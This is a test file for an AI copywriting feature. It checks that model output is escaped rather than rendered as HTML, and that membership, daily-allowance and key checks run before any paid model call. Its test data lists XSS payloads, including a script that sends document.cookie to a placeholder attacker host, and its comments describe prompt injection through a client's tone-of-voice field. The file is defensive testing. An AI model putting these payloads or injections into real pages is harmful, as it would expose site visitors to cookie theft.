/**
 * The writing assistant.
 *
 * TWO THINGS IN HERE MATTER MORE THAN THE REST, and neither is "does it write
 * nice copy", which is not a testable claim.
 *
 * The first is that what the model says cannot become markup. The prompt has a
 * client's own writing in it, changing what the model says is the entire point of
 * a prompt injection, and the answer goes into a page somebody publishes. So the
 * first block below tries to get a script tag out of the far end.
 *
 * The second is the bill. Every call costs Andy money and everybody with a login
 * can make one, so the checks on membership, on the intent, and on the daily
 * allowance are the difference between a feature and an open tap. Those are read
 * out of the action's source, in the same way tests/settings.test.ts reads the gate
 * on custom code: the runtime path needs a database and a live API key, and the
 * property worth proving is structural anyway.
 */

import { readFileSync } from 'node:fs';
import { join } from 'node:path';

import { describe, expect, it } from 'vitest';

import { MODEL } from '../lib/ai/anthropic';
import { toCopy, toHtml, toText } from '../lib/ai/copy';
import { sanitiseHtml } from '../lib/content/sanitise';

const ROOT = join(__dirname, '..');

// ---------------------------------------------------------------------------
// The one that matters
// ---------------------------------------------------------------------------

describe('nothing the model says can become markup', () => {
  /*
   * The realistic version of the attack. Somebody puts an instruction in their own
   * tone of voice field, the model follows it, and what comes back is a script
   * tag. Every one of these must arrive as words.
   */
  const attempts = [
    '<script>fetch("https://evil.example/"+document.cookie)</script>',
    '<img src=x onerror="alert(1)">',
    '<a href="javascript:alert(1)">Book now</a>',
    '<iframe src="https://evil.example"></iframe>',
    '<style>body{display:none}</style>',
    '<div onclick="steal()">Greece</div>',
    '<svg/onload=alert(1)>',
  ];

  /*
   * The assertion is that NO TAG FORMS, not that the words are absent. An escaped
   * onerror= is a run of visible characters in a paragraph, and asking for it to be
   * gone as well would be asking the sanitiser to censor prose. What must never
   * happen is a < that the browser reads as the start of an element.
   */
  it.each(attempts)('turns %s into visible text', (attempt) => {
    const html = toHtml(attempt);

    // Every tag in the output is one this file wrote. Nothing that arrived as a
    // character got out as markup.
    const tags = [...html.matchAll(/<\/?([a-z]+)/gi)].map((m) => m[1].toLowerCase());
    expect(tags.every((tag) => ['p', 'br', 'ul', 'li'].includes(tag)), html).toBe(true);

    // The angle brackets survive as entities, which is what makes this a visible
    // mistake somebody deletes rather than a silent one.
    expect(html).toContain('&lt;');
  });

  it('escapes before it wraps, so a tag cannot close the paragraph it is in', () => {
    expect(toHtml('</p><script>x()</script><p>')).not.toContain('<script');
  });

  it('and the plain form carries no markup at all', () => {
    for (const attempt of attempts) {
      expect(toText(attempt)).not.toMatch(/<[a-z]/i);
    }
  });

  /*
   * Belt and braces, checked. lib/ai/copy.ts escapes everything itself AND runs the
   * result through the sanitiser. If the second pass ever changed the output, one
   * of the two is wrong about what it produces.
   */
  it('what it builds is already what the sanitiser would allow', () => {
    const html = toHtml('Trips to Greece.\n\n- Small groups\n- Real guides');
    expect(sanitiseHtml(html)).toBe(html);
  });
});

// ---------------------------------------------------------------------------
// Shaping the answer
// ---------------------------------------------------------------------------

describe('plain copy becomes paragraphs', () => {
  it('a blank line starts a new paragraph', () => {
    expect(toHtml('One.\n\nTwo.')).toBe('<p>One.</p><p>Two.</p>');
  });

  it('a single newline is a line break, because it is usually a wrapped line', () => {
    expect(toHtml('One.\nStill one.')).toBe('<p>One.<br />Still one.</p>');
  });

  it('nothing in, nothing out', () => {
    expect(toHtml('')).toBe('');
    expect(toHtml('   \n\n  ')).toBe('');
    expect(toHtml(null)).toBe('');
    expect(toHtml(42)).toBe('');
  });

  it('a run of bullets becomes a list', () => {
    expect(toHtml('- Greece\n- Cyprus')).toBe('<ul><li>Greece</li><li>Cyprus</li></ul>');
    expect(toHtml('1. Greece\n2. Cyprus')).toBe('<ul><li>Greece</li><li>Cyprus</li></ul>');
    expect(toHtml('• Greece\n• Cyprus')).toBe('<ul><li>Greece</li><li>Cyprus</li></ul>');
  });

  /*
   * The case that decides whether reading bullets is a good idea at all. A
   * paragraph that happens to open with a dash is a paragraph, and turning it into
   * a one-item list would be the feature damaging ordinary prose.
   */
  it('a paragraph that merely starts with a dash stays a paragraph', () => {
    const html = toHtml('- and that is the point.\nWe have been going since 1994.');
    expect(html).toContain('<p>');
    expect(html).not.toContain('<ul>');
  });

  it('a list followed by a paragraph keeps them apart', () => {
    expect(toHtml('- Greece\n- Cyprus\n\nBook by March.')).toBe(
      '<ul><li>Greece</li><li>Cyprus</li></ul><p>Book by March.</p>',
    );
  });

  it('takes the markdown markers off, since the prompt asked for none', () => {
    expect(toHtml('Our **best** trips.')).toBe('<p>Our best trips.</p>');
    expect(toHtml('Our __best__ trips.')).toBe('<p>Our best trips.</p>');
    expect(toHtml('## Greece')).toBe('<p>Greece</p>');
  });

  it('stops after a sane number of paragraphs', () => {
    const many = Array.from({ length: 200 }, (_, i) => `Para ${i}.`).join('\n\n');
    expect([...toHtml(many).matchAll(/<p>/g)].length).toBeLessThanOrEqual(40);
  });
});

describe('the plain form, for a heading', () => {
  it('is one line, whatever it arrived as', () => {
    expect(toText('Greece and Cyprus,\ntailor made.')).toBe('Greece and Cyprus, tailor made.');
  });

  it('loses the bullet marker, which would read as a typo in a heading', () => {
    expect(toText('- Greece')).toBe('Greece');
    expect(toText('## Greece')).toBe('Greece');
  });

  it('collapses the whitespace a model leaves behind', () => {
    expect(toText('  Greece   and    Cyprus  ')).toBe('Greece and Cyprus');
  });

  it('toCopy returns both shapes of the same answer', () => {
    const copy = toCopy('Greece.\n\nCyprus.');
    expect(copy.html).toBe('<p>Greece.</p><p>Cyprus.</p>');
    expect(copy.text).toBe('Greece. Cyprus.');
  });
});

// ---------------------------------------------------------------------------
// The bill
// ---------------------------------------------------------------------------

describe('nothing is spent before the checks pass', () => {
  const source = readFileSync(join(ROOT, 'app', 'actions', 'ai.ts'), 'utf8');
  const body = source.slice(source.indexOf('export async function writeCopyAction'));

  const at = (needle: string) => {
    const index = body.indexOf(needle);
    expect(index, `${needle} is not in the action at all`).toBeGreaterThan(-1);
    return index;
  };

  it('membership is required, and before the model is called', () => {
    expect(at('requireSite()')).toBeLessThan(at('await ask('));
  });

  it('the daily allowance is claimed before the model is called', () => {
    expect(at('claimRequest(')).toBeLessThan(at('await ask('));
  });

  it('and the key is checked first of all, so a preview says so rather than crashing', () => {
    expect(at('aiIsConfigured()')).toBeLessThan(at('requireSite()'));
  });

  it('the intent is a member of the closed set, not whatever arrived', () => {
    expect(body).toContain('isAiIntent(fields.intent)');
  });

  it('an empty request is refused rather than paid for', () => {
    expect(body).toContain('!instruction && !selection');
  });

  /*
   * The order the two writes happen in. Recording the spend AFTER the answer would
   * mean a call that times out costs money and counts for nothing, which puts a
   * loop of failing requests outside the limit and inside the bill.
   */
  it('the slot is taken before the call, and the cost recorded after', () => {
    expect(at('claimRequest(')).toBeLessThan(at('await ask('));
    expect(at('recordTokens(')).toBeGreaterThan(at('await ask('));
  });
});

describe('the limit is counted somewhere that survives a cold start', () => {
  const db = readFileSync(join(ROOT, 'lib', 'db', 'ai.ts'), 'utf8');

  it('in the database, not in a module-level map', () => {
    expect(db).toContain('from public.ai_usage');
    expect(db).not.toMatch(/^const \w+ = new Map/m);
  });

  /*
   * Counted and inserted in ONE statement, which closes the gap inside a single
   * request. It does not serialise against other transactions at READ COMMITTED,
   * and lib/db/ai.ts says so rather than claiming otherwise.
   */
  it('and counted in the same statement that inserts, so one request has no gap', () => {
    const claim = db.slice(db.indexOf('export async function claimRequest'));
    const sql = claim.slice(claim.indexOf('tx`'), claim.indexOf('`;'));
    expect(sql).toContain('with used as');
    expect(sql).toContain('insert into public.ai_usage');
  });

  it('and the limit is honest about what that does not cover', () => {
    // A comment claiming a race is impossible would be worse than no comment:
    // somebody would build a billing number on top of it.
    expect(db).toMatch(/READ COMMITTED/);
  });

  it('every query goes through withTenant, so the policy does the scoping', () => {
    const queries = [...db.matchAll(/\btx`/g)].length;
    const scopes = [...db.matchAll(/withTenant\(/g)].length;
    expect(queries).toBeGreaterThan(0);
    // One scope per query. A tx` outside a withTenant would not compile, but a
    // second query smuggled into one scope is how a WHERE tenant_id creeps back.
    expect(scopes).toBe(queries);
  });

  it('and no query filters by tenant by hand, which is what the policy is for', () => {
    expect(db).not.toMatch(/where[\s\S]{0,40}tenant_id\s*=/i);
  });
});

describe('the key and the model', () => {
  it('the client is server-only, so a stray import fails the build', () => {
    const client = readFileSync(join(ROOT, 'lib', 'ai', 'anthropic.ts'), 'utf8');
    expect(client).toContain("import 'server-only'");
  });

  it('the key is read from the environment and never returned', () => {
    const client = readFileSync(join(ROOT, 'lib', 'ai', 'anthropic.ts'), 'utf8');
    expect(client).toContain('process.env.ANTHROPIC_API_KEY');
    // An upstream error body can quote our own request, and our request has the
    // client's profile in it. It is logged, never handed back.
    expect(client).not.toMatch(/new AiError\([^)]*body/);
  });

  it('the model id is pinned to a version rather than an alias', () => {
    // An alias moving under a feature whose job is the exact tone of a sentence is
    // a change nobody notices until a client does.
    expect(MODEL).toMatch(/-\d{8}$/);
  });

  it('nothing outside the client talks to Anthropic directly', () => {
    const action = readFileSync(join(ROOT, 'app', 'actions', 'ai.ts'), 'utf8');
    expect(action).not.toContain('api.anthropic.com');
    expect(action).not.toContain('ANTHROPIC_API_KEY');
  });
});
